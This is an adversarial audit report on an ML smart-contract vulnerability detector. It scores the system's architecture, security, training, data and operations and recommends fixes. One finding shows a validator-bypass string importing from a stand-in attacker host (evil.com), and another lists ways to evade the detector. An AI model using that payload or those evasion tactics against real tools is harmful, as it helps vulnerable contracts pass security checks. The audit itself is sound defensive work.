# SENTINEL ML System — Hostile Adversarial Audit Report

**Date:** 2026-05-18  
**Auditor:** Independent Red-Team Review  
**Scope:** Full ML source tree (`src/`, `scripts/`) — architecture, security, robustness, code quality, training pipeline, inference API  
**Codebase Version:** v6.0 (three-eye architecture, schema v6)



### 1.2 Weaknesses & Attack Vectors

**W1.1 — Fusion Bottleneck Remains:** Despite cross-attention, the fusion still projects to a single 128-dim vector per eye before concatenation to 384 dims. For 10 vulnerability classes with overlapping structural patterns, this is a severe compression bottleneck. A hostile adversary could craft contracts where two vulnerability patterns map to the same 128-dim region, causing the model to systematically miss one.

**W1.1 — Single Graph per Contract:** The entire AST/CFG for a contract becomes one graph. There is no sub-graph extraction for individual functions. A long contract with 50+ functions dilutes the GNN signal — the function-level pooling helps, but the three-phase message passing must traverse the entire graph. An adversary could pad a malicious function with 40+ benign wrapper functions to dilute the GNN's attention.

**W1.2 — Fixed 512-Token Window:** Despite the sliding-window mechanism for long contracts, the underlying token representation is still 512-token windows. The sliding window uses max-pooling across windows for aggregation, which means a vulnerability present in window 3 but not in windows 1-2 gets a single probability — not a contextualized representation. The window CLS tokens don't communicate with each other before the final max-pool.

**W1.3 — No Attention Weight Extraction:** Both `CrossAttentionFusion` and `WindowAttentionPooler` explicitly disable attention weight return (`need_weights=False`). While this saves VRAM, it means **zero explainability** at inference time. An auditor cannot verify *why* the model flagged a contract. In a security context, this is a significant gap.

**W1.4 — Edge Type Design Asymmetry:** Phases 2 and 3 each get 2 layers, but Phase 2 (CONTROL_FLOW) processes only type-6 edges while Phase 3 (REVERSE_CONTAINS) processes only type-7 edges. The asymmetry means CFG nodes never directly propagate to other CFG nodes through Phase 3 — they only go upward to FUNCTION nodes. Multi-hop reentrancy patterns that span function boundaries (e.g., callback A→B→A) require cross-function CFG propagation that the current architecture doesn't support.

---

## 2. Security & Adversarial Robustness — 45/100

This is the weakest category. A smart contract vulnerability detector that cannot withstand adversarial input is a security tool that provides false confidence.

### 2.1 Critical Vulnerabilities

**C2.1 — No Input Sanitization for Slither/AST Pipeline:** The graph extraction pipeline passes user-supplied Solidity directly to Slither, which shells out to solc. While `api.py` checks for "pragma" and "contract" keywords, this is trivially bypassable:

```python
# Bypasses the validator:
source_code = "pragma solidity ^0.8.0; contract X {} import 'http://evil.com/payload';"
# Or:
source_code = "pragma solidity; contract X { function f() public { /* normal looking but with malicious pragma that exploits solc */ } }"
```

The `MAX_SOURCE_BYTES` (1MB) limit is reasonable but does not prevent resource exhaustion through deeply nested ASTs that produce enormous graphs.

**C2.2 — Checkpoint Loading with `weights_only=False`:** The `Predictor` class loads checkpoints with `weights_only=False`:

```python
raw = torch.load(checkpoint, map_location=self.device, weights_only=False)
```

This is a **remote code execution** vulnerability if an attacker can replace the checkpoint file. The comment says "LoRA state dict contains peft-specific classes — weights_only=True blocks them", but the correct fix is to register the peft classes as safe globals (as was done for PyG Data classes), not to disable the security check entirely.

**C2.3 — MD5 for Hashing (Non-Cryptographic):** `hash_utils.py` uses MD5 for contract identification. MD5 is collision-prone — an adversary can craft two different Solidity files with the same MD5 hash. If one file is benign and the other malicious, the cache layer will return the benign analysis for the malicious file. The code acknowledges MD5 is "not security-critical, just need uniqueness," but in a security product, collision resistance IS a security property.

**C2.4 — No Rate Limiting or Authentication:** The FastAPI endpoint has zero authentication or rate limiting. An attacker can:
- Flood the endpoint with requests to exhaust GPU memory
- Submit deliberately crafted contracts that maximize Slither processing time (3-5 seconds each)
- Probe the model's decision boundaries to craft adversarial contracts

**C2.5 — Adversarial Solidity Evasion:** The model is trivially evadable by:
1. **Variable renaming:** The GNN uses structural features only; the Transformer uses CodeBERT tokens. Renaming `withdraw` to `_internal_transfer` would not change the CFG structure but would change the CLS representation.
2. **Dead code injection:** Adding 20+ dummy functions with complex CFGs but no state interactions dilutes the function-level pooling.
3. **Splitting patterns across functions:** A reentrancy split across functions A (external call) and B (state write after A calls back) with the callback via an intermediate contract breaks the single-function CEI detection.
4. **Pragma version manipulation:** Specifying an old pragma (e.g., ^0.4.25) changes solc's AST output, potentially producing different graph structures than what was seen in training.

**C2.6 — Drift Detector is Trivially Gameable:** The drift detector only tracks `num_nodes` and `num_edges` — two scalar statistics that are trivial to manipulate. An attacker submitting contracts with the same average node/edge counts as the training distribution would not trigger drift alerts, even if the vulnerability patterns are entirely different.

### 2.2 Moderate Vulnerabilities

**M2.1 — Temp File Race Condition:** `preprocess.py` uses `NamedTemporaryFile(delete=False)` for Slither. Between `tmp.write()` and `tmp.close()`, another process on the same machine could read the partial file. The `delete=False` is required for Windows compatibility, but creates a window for information leakage.

**M2.2 — Cache Poisoning:** The inference cache (`InferenceCache`) uses content-addressed MD5 keys. If an attacker can write to `~/.cache/sentinel/preprocess/`, they can poison the cache to return benign results for malicious contracts. The cache directory uses default permissions with no integrity verification.

**M2.3 — No Model Output Validation:** The predictor returns raw probabilities with no sanity checks. A corrupted model or adversarial perturbation could produce probabilities outside [0,1] or NaN values. The API layer does not validate the prediction output before returning it.

---

## 3. Training Stability & Correctness — 55/100

### 3.1 Known Instabilities (Documented but Unresolved)

**U3.1 — DoS Class is Effectively Unlearnable:** The `dos_loss_weight=0.0` setting completely zeroes the gradient for the DenialOfService class. This means the model's DoS predictions are based entirely on spurious correlations from other classes. The code acknowledges this ("3 pure training samples; 98.1% co-occur with Reentrancy"), but the "fix" is to pretend the class doesn't exist while keeping `NUM_CLASSES=10`. This creates a misleading 10-class model where one class is always wrong.

**U3.2 — GNN Collapse Still a Risk:** Despite multiple fixes (per-group LR multipliers, JK connections, function-level pooling), the GNN collapse detection system (streak counter at <10% gradient share) is a monitoring tool, not a prevention mechanism. The `gnn_lr_multiplier=2.5` is a band-aid — the root cause is that the Cross-Attention Fusion's gradient signal dominates the GNN's parameter updates. When fusion learns fast (its LR is only 0.5× base), it creates shortcuts that make the GNN eye redundant.

**U3.3 — eval_threshold=0.35 vs inference threshold=0.5:** The training evaluation uses a lower threshold (0.35) than inference (0.5). This means the early stopping signal is based on a different decision boundary than production. A model that appears to be improving at threshold=0.35 may actually be degrading at threshold=0.5. This is a fundamental train/serve skew.

**U3.4 — Per-Class Label Smoothing Calibration is Guesswork:** The `class_label_smoothing` dict has values ranging from 0.05 to 0.18, supposedly calibrated to "confirmed/estimated noise rates per class." But there is no documented methodology for how these values were derived. If the smoothing values are wrong, they inject systematic bias — for example, `Reentrancy: 0.14` means 14% of Reentrancy labels are assumed noisy, which pushes the model's Reentrancy probability toward 0.5 for all inputs.

**U3.5 — Scheduler Resume Bug History:** Fix #32 documents that OneCycleLR was created with `epochs=remaining_epochs` instead of `epochs=config.epochs` on resume, causing a total_steps mismatch. While fixed, this reveals that **the resume code path is complex and error-prone**. The `.state.json` sidecar file pattern is fragile — if either the checkpoint or the state file is missing/corrupt, training silently degrades.

### 3.2 Correctness Concerns

**C3.1 — ASL gamma_neg=2.0 After Collapse Fix:** The code reduced `asl_gamma_neg` from 4.0 to 2.0 to fix "all-zeros collapse with 60% zero-label rows." But the ASL paper recommends gamma_neg=4 for multi-label. The lower value may under-suppress easy negatives, leading to the model wasting gradient budget on well-classified negative cells. The fix traded one failure mode for another.

**C3.2 — Gradient Accumulation Normalization:** The `_actual_window` calculation for gradient accumulation divides by the actual number of micro-batches in the last window:

```python
_window_start = (batch_idx // accum_steps) * accum_steps
_actual_window = min(accum_steps, len(loader) - _window_start)
loss = (main_loss + aux_loss_weight * aux_loss) / _actual_window
```

This is correct for the tail window but interacts with the `scaler.step()` behavior — if the scaler skips a step (due to inf/nan gradients), the division factor is wrong for the next accumulation window because `batch_idx` advances but the gradients were not applied.

---

## 4. Code Quality & Maintainability — 72/100

### 4.1 Strengths

- **Exhaustive documentation:** Every module has detailed docstrings explaining the "why" not just the "what." The schema change history in `graph_schema.py` is a living changelog.
- **Defensive coding:** Shape guards, device assertion checks, early validation (`__post_init__`), and explicit error messages throughout.
- **Consistent patterns:** Typed exception hierarchy in `graph_extractor.py`, architecture allowlist in `predictor.py`, schema version in cache keys.
- **Audit trail:** Inline comments reference specific bug fixes (BUG-H2, BUG-M9, Fix #28, etc.) making it possible to trace why every line exists.

### 4.2 Weaknesses

**Q4.1 — Version-Driven Docstring Bloat:** Module docstrings have become changelog dumping grounds. `sentinel_model.py` has a 54-line docstring that is 80% version history. `gnn_encoder.py` has 64 lines of header before the first import. This makes the actual architecture description harder to find. Version history belongs in CHANGELOG.md, not in code.

**Q4.2 — Stale README Files:** The `src/models/README.md` describes the v1 architecture (64-dim GNN, frozen CodeBERT, FusionLayer with concat+MLP) — this is completely wrong for the current v6 three-eye architecture. Someone relying on the README would build incorrect mental models.

**Q4.3 — Inconsistent Import Paths:** The codebase uses both `ml.src.models.sentinel_model` and relative imports (`from ..preprocessing.graph_schema import ...`). Some files use `sys.path.insert(0, ...)` to bootstrap imports. This suggests the package was not designed with proper packaging from the start.

**Q4.4 — Dead Code Accumulation:** The `FocalLoss` class expects post-sigmoid probabilities, while `AsymmetricLoss` expects raw logits. The `MultiLabelFocalLoss` class exists but is never used in the training loop. The `legacy_binary` and `legacy` architecture paths in `predictor.py` are preserved "for compatibility" but add complexity.

**Q4.5 — Magic Numbers Without Constants:** Several important values are hardcoded:
- `gnn_jk_mode='attention'` is the only supported mode but `jk_mode='lstm'` is checked for rejection
- `_cls_hidden = 192` in `sentinel_model.py` — not configurable
- `pos_weight_min_samples=3000` — the threshold for clamping pos_weight
- `aux_loss_warmup_epochs=8` — a critical hyperparameter with no justification for this specific value

**Q4.6 — Global State Mutations:** `trainer.py` modifies global environment variables and logger state:

```python
os.environ["TRANSFORMERS_OFFLINE"] = "1"
os.environ["HF_HUB_OFFLINE"] = "1"
logger.remove()
logger.add(sys.stderr, level="INFO")
```

This is process-wide mutation that would affect any other code running in the same process (e.g., if training and inference run in the same container).

---

## 5. Data Pipeline Integrity — 60/100

### 5.1 Strengths

- **Centralized schema:** `graph_schema.py` is the single source of truth for node types, edge types, feature dimensions, and visibility encoding. The `assert` statements at module load time catch dimension mismatches early.
- **Feature version tracking:** `FEATURE_SCHEMA_VERSION` is embedded in cache keys and dataset caches, preventing stale features from being used silently.
- **In-place patching:** `patch_graph_features.py` can fix graphs on disk without re-extraction, and the code validates that all 44,470 graphs were patched.

### 5.2 Weaknesses

**D5.1 — Path-Based Hashing vs Content-Based Hashing:** The offline pipeline uses `get_contract_hash(path)` which hashes the file path, while the online pipeline uses `get_contract_hash_from_content(content)` which hashes the source code. This means the same contract at different paths produces different hashes offline but the same hash online. If a contract is moved in the filesystem, the offline cache breaks but the online cache doesn't — asymmetric and confusing.

**D5.2 — No Data Validation for Training Labels:** The label CSV is loaded with `pd.read_csv(label_csv)` with no schema validation. If a column is renamed or a row has non-binary values, the error surfaces deep inside the training loop as a shape mismatch, not at data load time.

**D5.3 — Token Truncation Rate Unknown:** The tokenizer uses `max_length=512, truncation=True` with no logging of how many training contracts were truncated. The sliding-window mechanism exists for inference but NOT for training — meaning the model is trained on truncated contracts. If critical vulnerability patterns consistently appear after position 512 in long contracts, the model systematically misses them during training.

**D5.4 — No Deduplication Guarantee:** The `dedup_multilabel_index.py` script exists, but there is no guarantee it was run correctly. The `multilabel_index_deduped.csv` path suggests it was, but the dataset loading code does not verify that graph/token pairs are actually unique.

**D5.5 — BCCC Dataset Known Limitations:** The BCCC-SCsVul-2024 dataset has documented issues:
- 60% zero-label rows (contracts with no vulnerability labels)
- DoS has only 257 training samples
- 14% Reentrancy label noise (contracts flagged as reentrancy but with no external calls)
- The "most functions" heuristic was wrong 47.4% of the time for multi-contract files

The code has workarounds for all of these, but the underlying data quality problems remain.

---

## 6. Inference Pipeline Reliability — 68/100

### 6.1 Strengths

- **Warmup forward pass:** The predictor runs a 2-node 1-edge dummy graph at startup to catch shape/CUDA issues before the first real request. This is good engineering.
- **Per-class thresholds:** Loaded from a companion JSON file, with fallback to a uniform threshold.
- **Async with timeout:** Inference runs in a thread with a configurable timeout (default 60s).
- **SIGKILL-safe temp file management:** `atexit` handler + startup scan for orphaned temp files.

### 6.2 Weaknesses

**I6.1 — No Request-Level Timeout for Slither:** While the API has a `PREDICT_TIMEOUT` for the overall inference, there is no way to kill a stuck Slither/solc process. If solc enters an infinite loop on a pathological input, the `asyncio.wait_for()` timeout fires, but the Slither subprocess may continue consuming resources.

**I6.2 — Cache TTL is Based on mtime:** The inference cache uses file modification time as the TTL clock. If the system clock is wrong or files are touched (e.g., by a backup process), valid cache entries are evicted or stale entries survive.

**I6.3 — Window Aggregation by Max is Fragile:** The `_aggregate_window_predictions` method uses max across windows. A single noisy window with a high false positive probability for any class will dominate the aggregate. No confidence calibration or uncertainty estimation is performed across windows.

**I6.4 — No Health Check for Model Quality:** The `/health` endpoint only checks if the model is loaded. It does not verify that the model produces sensible outputs. A corrupted checkpoint could load successfully but produce all-zero predictions, and the health check would still return "ok."

---

## 7. Operational Readiness — 50/100

### 7.1 Missing for Production

**O7.1 — No A/B Testing or Canary Deployment Support:** There is no mechanism to route a fraction of traffic to a new model version while keeping the old version as a fallback.

**O7.2 — No Model Performance Monitoring:** Prometheus gauges track model_loaded and GPU memory, but there are no metrics for:
- Prediction distribution (class balance drift)
- Inference latency percentiles
- Per-class precision/recall (requires ground truth labels)
- False positive rate over time

**O7.3 — No Rollback Mechanism:** The checkpoint path is set by `SENTINEL_CHECKPOINT` env var. Changing it requires a restart. There is no hot-swap capability.

**O7.4 — No Reproducibility Guarantees:** While the checkpoint saves `model_version` and `config`, there is no hash of the code that produced the model. Two training runs with the same config but different code versions could produce different models with the same checkpoint name.

**O7.5 — Drift Detection is Incomplete:** The DriftDetector only fires Prometheus counters — there is no automated response (e.g., alerting, fallback to a safe mode, or model retraining trigger). The warm-up period (500 requests or pre-computed baseline) means the first 500 requests have no drift protection at all.

**O7.6 — No End-to-End Integration Tests:** The test contracts in `scripts/test_contracts/` (20 Solidity files) are used for manual testing only. There is no automated CI pipeline that runs the full graph-extract → tokenize → predict → verify cycle.

---

## 8. Detailed Finding Summary

### CRITICAL (Immediate Action Required)

| ID | Category | Finding | Impact |
|---|---|---|---|
| C2.2 | Security | `weights_only=False` in Predictor checkpoint loading | Remote code execution if checkpoint file is replaced |
| C2.4 | Security | No authentication or rate limiting on API | Resource exhaustion, model probing attacks |
| C2.5 | Security | No adversarial robustness — trivial evasion via renaming, dead code, cross-function splitting | Model provides false security confidence |
| U3.1 | Training | DoS class gradient zeroed — predictions are meaningless | 10% of output classes are actively wrong |

### HIGH (Fix Before Production)

| ID | Category | Finding | Impact |
|---|---|---|---|
| C2.1 | Security | No Slither/solc input sanitization | Resource exhaustion, potential solc exploits |
| C2.3 | Security | MD5 hashing — collision-prone for cache keys | Cache poisoning, deduplication bypass |
| C2.6 | Security | Drift detector tracks only node/edge counts | Gameable — adversarial distribution shifts undetected |
| M2.2 | Security | Cache poisoning via filesystem write access | Attacker returns benign results for malicious contracts |
| U3.3 | Training | eval_threshold ≠ inference threshold | Train/serve skew degrades early stopping |
| D5.3 | Data | Token truncation during training, no sliding window | Model trained on incomplete long contracts |
| I6.1 | Inference | No Slither subprocess timeout | Stuck processes consume resources indefinitely |

### MEDIUM (Fix in Next Iteration)

| ID | Category | Finding | Impact |
|---|---|---|---|
| W1.3 | Architecture | No attention weight extraction — zero explainability | Cannot audit model decisions |
| W1.1 | Architecture | 128-dim eye bottleneck for 10 classes | Pattern collisions between vulnerability types |
| Q4.2 | Quality | Stale README files describe v1 architecture | Developer onboarding confusion |
| Q4.6 | Quality | Global state mutation in trainer | Side effects on co-located processes |
| Q4.3 | Quality | Inconsistent import paths | Packaging/deployment issues |
| M2.1 | Security | Temp file race condition | Information leakage on shared hosts |
| I6.3 | Inference | Max-pooling across windows is fragile to noise | Single noisy window dominates prediction |
| U3.4 | Training | Per-class label smoothing values are uncalibrated | Systematic bias injection |
| D5.1 | Data | Path vs content hashing inconsistency | Cache invalidation confusion |

### LOW (Technical Debt)

| ID | Category | Finding | Impact |
|---|---|---|---|
| Q4.1 | Quality | Version history bloating docstrings | Reduced readability |
| Q4.4 | Quality | Dead code (unused loss classes, legacy paths) | Maintenance burden |
| Q4.5 | Quality | Magic numbers without constants | Reduced configurability |
| O7.4 | Ops | No code hash in checkpoint | Reproducibility gap |
| O7.6 | Ops | No automated E2E integration tests | Regression risk |

---

## 9. Scoring Breakdown

### Architecture & Design: 78/100
The three-eye architecture with multi-phase GNN, LoRA-adapted CodeBERT, and cross-attention fusion is well-designed. The auxiliary heads and JK connections address real problems. Loss of points for the eye bottleneck, lack of explainability, and the single-graph-per-contract limitation.

### Security & Adversarial Robustness: 45/100
This is the most concerning category. A security tool with no authentication, no input sanitization, no adversarial robustness, and a remote code execution vector in checkpoint loading is not production-safe. The model can be trivially evaded by any determined attacker.

### Training Stability & Correctness: 55/100
The extensive bug fix history shows the team has been responsive, but the number and severity of bugs that have been found (DoS class collapse, GNN gradient collapse, scheduler resume bug, ASL all-zeros collapse, label noise) suggests the training pipeline is fragile. The eval_threshold skew and uncalibrated label smoothing are ongoing risks.

### Code Quality & Maintainability: 72/100
The code is well-documented with clear intent, but suffers from docstring bloat, stale documentation, dead code, and inconsistent patterns. The defensive coding and audit trail are excellent.

### Data Pipeline Integrity: 60/100
Centralized schema and version tracking are good. The path-vs-content hashing inconsistency, lack of training-time sliding windows, and BCCC dataset quality issues are significant concerns.

### Inference Pipeline Reliability: 68/100
The warmup pass, per-class thresholds, and timeout handling are good. The lack of Slither subprocess control, fragile window aggregation, and missing model quality health checks reduce confidence.

### Operational Readiness: 50/100
No A/B testing, no model performance monitoring, no rollback mechanism, incomplete drift detection, and no automated E2E tests. This system needs significant operational infrastructure before production deployment.

---

## 10. Recommended Priority Actions

1. **Fix `weights_only=False`** (C2.2): Register peft/LoRA classes as safe globals. This is a known RCE vector.

2. **Add API authentication and rate limiting** (C2.4): Even a simple API key check would prevent the most basic abuse.

3. **Remove DoS class or mark as unsupported** (U3.1): A class with zeroed gradient is actively misleading. Either augment the data, remove the class, or clearly document that DoS predictions are unreliable.

4. **Unify eval_threshold and inference threshold** (U3.3): Training evaluation should use the same decision boundary as production, or the early stopping criterion should be based on a threshold-independent metric like AUC-ROC.

5. **Add sliding-window tokenization to training** (D5.3): The model should be trained on the same input representation it sees at inference time.

6. **Add Slither subprocess timeout** (I6.1): Use `subprocess.Popen` with a timeout or `signal.alarm` to kill stuck solc processes.

7. **Add basic adversarial hardening** (C2.5): At minimum, add test cases for variable renaming, dead code injection, and cross-function pattern splitting to evaluate the model's robustness.

8. **Replace MD5 with SHA-256** (C2.3): SHA-256 is not significantly slower and eliminates collision concerns.

9. **Add attention weight extraction for explainability** (W1.3): At minimum, store attention weights for a "debug" mode that can be enabled per request.

10. **Update stale documentation** (Q4.2): The README files are dangerously out of date and could mislead new developers.

---

## 11. Conclusion

SENTINEL is a **technically ambitious and architecturally sophisticated** system that demonstrates deep understanding of GNN design, multi-modal fusion, and training dynamics for multi-label classification. The three-eye architecture with auxiliary heads, JK connections, and cross-attention fusion represents genuine innovation in the smart contract vulnerability detection space.

However, the system has **critical security gaps** that make it unsafe for production deployment in its current state. The `weights_only=False` checkpoint loading, absent API authentication, trivial adversarial evasion, and meaningless DoS class predictions are blocking issues. The training pipeline shows signs of fragility — the extensive bug fix history, while admirable, indicates that the system has not yet reached a stable equilibrium.

The 62/100 score reflects a system that is **architecturally sound but operationally immature**. With focused investment in security hardening, adversarial robustness, and operational infrastructure, this system has the potential to be genuinely useful. Without it, it risks providing a false sense of security — the most dangerous outcome for a vulnerability detection tool.

---

*End of Audit Report*
